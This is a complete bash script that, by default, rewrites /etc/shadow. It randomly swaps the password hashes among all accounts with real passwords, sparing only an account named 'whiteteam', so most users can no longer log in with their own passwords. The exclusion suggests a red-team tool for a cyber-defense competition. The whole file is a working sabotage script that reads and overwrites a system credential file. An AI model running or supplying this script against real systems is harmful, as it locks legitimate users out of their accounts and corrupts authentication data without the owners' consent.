#!/usr/bin/env bash
set -euo pipefail

# username to exclude from shuffling
excluded_user="whiteteam"

input="${1:-/etc/shadow}"
orig_owner="$(stat -c '%u:%g' -- "$input")"
orig_mode="$(stat -c '%a' -- "$input")"
orig_dir="$(dirname -- "$input")"
orig_base="$(basename -- "$input")"
tmp="$(mktemp -p "$orig_dir" "${orig_base}.tmp.XXXXXX")"
trap 'rm -f -- "$tmp"' EXIT

declare -a lines usernames hashes restparts is_real_indices
while IFS= read -r line || [ -n "$line" ]; do
    lines+=("$line")
done < "$input"

for i in "${!lines[@]}"; do
    line="${lines[i]}"
    if [[ -z "$line" || "${line:0:1}" == "#" ]]; then
        usernames[i]="" ; hashes[i]="" ; restparts[i]=""
        continue
    fi
    IFS=':' read -r user pass rest <<< "$line" || true
    usernames[i]="$user"
    hashes[i]="$pass"
    restparts[i]="${line#${user}:${pass}:}"

    # Only consider "real" accounts for shuffling, but EXCLUDE $excluded_user explicitly
    if [[ "$user" == "$excluded_user" ]]; then
        # do not add to is_real_indices; leave hashes[i] as-is so it will not be changed
        continue
    fi

    if [[ -n "$pass" && "$pass" != "*" && "$pass" != "!" && "$pass" != "!!" && "${pass:0:1}" != "!" ]]; then
        is_real_indices+=("$i")
    fi
done

if [ "${#is_real_indices[@]}" -lt 2 ]; then
    echo "Less than 2 real accounts found (excluding '$excluded_user'); nothing to shuffle." >&2
    rm -f -- "$tmp"
    trap - EXIT
    exit 0
fi

real_hashes=()
for idx in "${is_real_indices[@]}"; do
    real_hashes+=("${hashes[idx]}")
done

mapfile -t shuffled_hashes < <(printf '%s\n' "${real_hashes[@]}" | shuf)

for k in "${!is_real_indices[@]}"; do
    idx="${is_real_indices[k]}"
    hashes[idx]="${shuffled_hashes[k]}"
done

{
    for i in "${!lines[@]}"; do
        if [[ -z "${usernames[i]}" && -z "${restparts[i]}" && -z "${hashes[i]}" ]]; then
            printf '%s\n' "${lines[i]}"
            continue
        fi

        if [[ -n "${restparts[i]}" ]]; then
            printf '%s:%s:%s\n' "${usernames[i]}" "${hashes[i]}" "${restparts[i]}"
        else
            printf '%s:%s\n' "${usernames[i]}" "${hashes[i]}"
        fi
    done
} > "$tmp"

chmod -- "$orig_mode" "$tmp"
chown -- "$orig_owner" "$tmp" 2>/dev/null || true

mv -f -- "$tmp" "$input"

trap - EXIT

echo "Overwrote: $input"
echo "Real accounts shuffled (excluding '$excluded_user'): ${#is_real_indices[@]}"
